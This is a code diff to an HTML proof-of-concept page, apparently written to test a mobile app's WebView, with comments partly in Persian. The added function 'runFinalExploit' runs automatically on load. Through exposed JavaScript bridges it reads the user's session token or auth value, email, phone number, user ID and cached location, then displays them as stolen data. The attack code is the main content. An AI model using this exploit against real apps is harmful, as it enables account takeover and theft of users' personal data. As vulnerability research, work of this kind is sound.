@@ -32,36 +32,46 @@
     </div>
 
     <script>
-    function log(message, color = "#0f0") {
+    function log(message, isCritical = false) {
         var logBox = document.getElementById('logs');
-        if(logBox.innerHTML.includes("Waiting")) logBox.innerHTML = "";
-        logBox.innerHTML += "> <span style='color:" + color + "'>" + message + "</span><br>";
+        var color = isCritical ? "#ff4757" : "#2ed573";
+        logBox.innerHTML += "> <span style='color:" + color + ";'>" + message + "</span><br>";
     }
 
-    function discoverBridges() {
-        var bridges = ["Storage_a", "IBUStorageV2_a", "Locate_a", "Photo_a", "Storage"];
-        
-        bridges.forEach(function(b) {
-            if (window[b]) {
-                log("--- Inspecting: " + b + " ---", "yellow");
-                // لیست کردن تمام متدها و ویژگی‌های موجود در این شیء
-                var methods = [];
-                for (var prop in window[b]) {
-                    methods.push(prop);
-                }
-                
-                if (methods.length > 0) {
-                    log("Available Methods: " + methods.join(", "), "#fff");
-                } else {
-                    log("No methods visible. (Check @JavascriptInterface)", "red");
-                }
+    function runFinalExploit() {
+        log("Starting Targeted Extraction...");
+
+        // ۱. استخراج توکن کاربر از IBUStorageV2_a (بسیار خطرناک)
+        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
+            var token = window.IBUStorageV2_a.IBUGetUserValue("token");
+            if (token) {
+                log("CRITICAL: Stolen User Token: " + token, true);
+                alert("Account Takeover Proven! Token: " + token);
             } else {
-                log(b + " not found in window.", "#555");
+                log("IBUGetUserValue('token') returned null. Trying 'auth'...");
+                var auth = window.IBUStorageV2_a.IBUGetUserValue("auth");
+                if(auth) log("CRITICAL: Stolen Auth: " + auth, true);
             }
-        });
+        }
+
+        // ۲. استخراج از Storage_a بر اساس متد get در CTStorage.java
+        // پارامترها: (domain, key, default)
+        if (window.Storage_a && window.Storage_a.get) {
+            var sensitiveKeys = ["email", "userName", "mobile", "uid"];
+            sensitiveKeys.forEach(function(k) {
+                var val = window.Storage_a.get("common", k, "not_found");
+                if (val !== "not_found") log("SENSITIVE DATA: " + k + " = " + val, true);
+            });
+        }
+
+        // ۳. نقض حریم خصوصی با Locate_a
+        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
+            var loc = window.Locate_a.getCachedLocationData();
+            log("PRIVACY LEAK: Cached Location: " + JSON.stringify(loc), true);
+        }
     }
 
-    setTimeout(discoverBridges, 1500);
+    setTimeout(runFinalExploit, 2000);
 </script>
 </body>
 </html>
